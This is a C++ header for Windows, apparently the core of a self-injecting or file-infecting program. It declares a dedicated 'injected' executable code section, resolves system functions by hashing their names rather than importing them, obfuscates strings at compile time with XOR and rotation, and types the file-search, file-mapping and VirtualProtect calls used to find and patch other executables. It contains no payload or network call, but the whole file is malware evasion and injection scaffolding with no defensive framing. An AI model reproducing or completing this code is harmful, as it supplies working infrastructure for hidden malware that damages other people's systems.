#ifndef _LIBPROC_H_
#define _LIBPROC_H_

#include <Windows.h>
#include <stdio.h>

#define OBF_KEY 0x42
#define OBF_ROT 5

EXTERN_C_START

#ifdef DEBUG
#define LOG(fmt, ...)                             \
    do {                                          \
        printf("[DEBUG] " fmt "\n", __VA_ARGS__); \
    } while (0)
#else
#define LOG(fmt, ...) /* [No logging] */
#endif

#define NT_CURRENT_TEB() ((PTEB)__readgsqword(FIELD_OFFSET(NT_TIB, Self)))

typedef HMODULE(WINAPI *LoadLibraryA_t)(IN LPCSTR lpLibFileName);
typedef int(WINAPI *MessageBoxA_t)(IN HWND hWnd OPTIONAL, IN LPCSTR lpText OPTIONAL,
                                   IN LPCSTR lpCaption OPTIONAL, IN UINT uType);
typedef DWORD(WINAPI *GetModuleFileNameA_t)(IN HMODULE hModule OPTIONAL, OUT LPSTR lpFilename,
                                            IN DWORD nSize);
typedef HANDLE(WINAPI *CreateFileA_t)(IN LPCSTR lpFileName, IN DWORD dwDesiredAccess,
                                      IN DWORD dwShareMode,
                                      IN LPSECURITY_ATTRIBUTES lpSecurityAttributes OPTIONAL,
                                      IN DWORD dwCreationDisposition, IN DWORD dwFlagsAndAttributes,
                                      IN HANDLE hTemplateFile OPTIONAL);
typedef DWORD(WINAPI *GetFileSize_t)(IN HANDLE hFile, OUT LPDWORD lpFileSizeHigh OPTIONAL);
typedef HANDLE(WINAPI *CreateFileMappingA_t)(
    IN HANDLE hFile, IN LPSECURITY_ATTRIBUTES lpFileMappingAttributes OPTIONAL, IN DWORD flProtect,
    IN DWORD dwMaximumSizeHigh, IN DWORD dwMaximumSizeLow, IN LPCSTR lpName OPTIONAL);
typedef LPVOID(WINAPI *MapViewOfFile_t)(IN HANDLE hFileMappingObject, IN DWORD dwDesiredAccess,
                                        IN DWORD dwFileOffsetHigh, IN DWORD dwFileOffsetLow,
                                        IN SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI *VirtualProtect_t)(IN LPVOID lpAddress, IN SIZE_T dwSize, IN DWORD flNewProtect,
                                       OUT PDWORD lpflOldProtect);
typedef BOOL(WINAPI *FlushViewOfFile_t)(IN LPCVOID lpBaseAddress, IN SIZE_T dwNumberOfBytesToFlush);
typedef BOOL(WINAPI *UnmapViewOfFile_t)(IN LPCVOID lpBaseAddress);
typedef BOOL(WINAPI *CloseHandle_t)(IN HANDLE hObject);
typedef DWORD(WINAPI *GetCurrentDirectoryA_t)(IN DWORD nBufferLength, OUT LPSTR lpBuffer OPTIONAL);
typedef HANDLE(WINAPI *FindFirstFileA_t)(IN LPCSTR lpFileName,
                                         OUT LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *FindNextFileA_t)(IN HANDLE hFindFile, OUT LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *FindClose_t)(IN OUT HANDLE hFindFile);
typedef HLOCAL(WINAPI *LocalAlloc_t)(IN UINT uFlags, IN SIZE_T uBytes);
typedef HLOCAL(WINAPI *LocalFree_t)(IN HLOCAL hMem);

#pragma section("injected", read, execute)

__declspec(code_seg("injected")) PVOID GetDll(IN CONST ULONGLONG ullDllNameHash);
__declspec(code_seg("injected")) PVOID GetFunc(IN CONST PVOID pDllBase,
                                               IN CONST ULONGLONG ullFuncNameHash);

EXTERN_C_END

#define MOD(x, n) (((x) % (n) + (n)) % (n))

#define MY_ROTL64(val, n) (((val) << MOD(n, 64)) | ((val) >> (-(n) & 63)))
#define MY_ROTR64(val, n) (((val) >> MOD(n, 64)) | ((val) << (-(n) & 63)))
#define MY_ROTL32(val, n) (((val) << MOD(n, 32)) | ((val) >> (-(n) & 31)))
#define MY_ROTR32(val, n) (((val) >> MOD(n, 32)) | ((val) << (-(n) & 31)))
#define MY_ROTL16(val, n) (((val) << MOD(n, 16)) | ((val) >> (-(n) & 15)))
#define MY_ROTR16(val, n) (((val) >> MOD(n, 16)) | ((val) << (-(n) & 15)))
#define MY_ROTL8(val, n) (((val) << MOD(n, 8)) | ((val) >> (-(n) & 7)))
#define MY_ROTR8(val, n) (((val) >> MOD(n, 8)) | ((val) << (-(n) & 7)))

__declspec(code_seg("injected")) constexpr DWORD my_toupper(IN DWORD c) {
    if (c >= 'a' && c <= 'z') {
        return c & ~0x20;
    }
    return c;
}

__declspec(code_seg("injected")) constexpr ULONGLONG my_strhash(IN LPCSTR sName) {
    ULONGLONG hash = 0;
    while (*sName) {
        hash = MY_ROTL64(hash, 13) + my_toupper(*sName++);
    }
    return hash;
}

__declspec(code_seg("injected")) constexpr ULONGLONG my_strhash(IN LPCWSTR wsName) {
    ULONGLONG hash = 0;
    while (*wsName) {
        hash = MY_ROTL64(hash, 13) + my_toupper(*wsName++);
    }
    return hash;
}

__declspec(code_seg("injected")) static inline int my_stricmp(IN LPCSTR s1, IN LPCSTR s2) {
    while (*s1 && *s2 && my_toupper(*s1) == my_toupper(*s2)) {
        s1++;
        s2++;
    }
    return my_toupper(*s1) - my_toupper(*s2);
}

__declspec(code_seg("injected")) static inline LPSTR my_strcpy(OUT LPSTR sDest, IN LPCSTR sSrc) {
    while ((*sDest++ = *sSrc++))
        ;
    return sDest;
}

__declspec(code_seg("injected")) static inline LPSTR my_strcat(IN OUT LPSTR sDest, IN LPCSTR sSrc) {
    while (*sDest) {
        sDest++;
    }
    while (*sSrc) {
        *sDest++ = *sSrc++;
    }
    *sDest = '\0';
    return sDest;
}

__declspec(code_seg("injected")) static inline LPSTR my_strappend(IN LPSTR sDest,
                                                                  IN CONST CHAR cChr) {
    while (*sDest) {
        sDest++;
    }
    *sDest++ = cChr;
    *sDest = '\0';
    return sDest;
}

__declspec(code_seg("injected")) static inline LPCSTR my_getfilename(IN LPCSTR sPath) {
    LPCSTR sName = sPath;
    while (*sPath) {
        if (*sPath++ == '\\') {
            sName = sPath;
        }
    }
    return sName;
}

template <ULONGLONG hash>
struct Hash {
    static constexpr ULONGLONG hash = hash;
};

#define STRHASH(s) (Hash<my_strhash(s)>::hash)

template <DWORD N>
struct Obfuscated {
    CHAR data[N];
    static constexpr DWORD size = N;

    __declspec(code_seg("injected")) consteval Obfuscated(CONST CHAR (&_data)[N]) {
        for (DWORD i = 0; i < N; ++i) {
            data[i] = MY_ROTL8(_data[i] ^ OBF_KEY, OBF_ROT);
        }
    }
};

template <DWORD N>
struct Deobfuscator {
    CHAR data[N];
    static constexpr DWORD size = N;

    __declspec(code_seg("injected")) Deobfuscator(CONST CHAR (&_data)[N]) {
        for (DWORD i = 0; i < N; ++i) {
            data[i] = MY_ROTR8(_data[i], OBF_ROT) ^ OBF_KEY;
        }
    }

    __declspec(code_seg("injected")) Deobfuscator(CONST Obfuscated<N> &obf)
        : Deobfuscator(obf.data) {}

    __declspec(code_seg("injected")) operator LPCSTR() const {
        return data;
    }
};

#define DECLARE_OBFUSCATED(name, data)                                                \
    __declspec(allocate("injected")) static CONST auto name##_obf = Obfuscated(data); \
    CONST Deobfuscator name##_deobf = Deobfuscator(name##_obf);

#define GET_DLL(name) GetDll(STRHASH(L## #name))
#define GET_FUNC(base, name) (name##_t) GetFunc(base, STRHASH(#name))

#endif
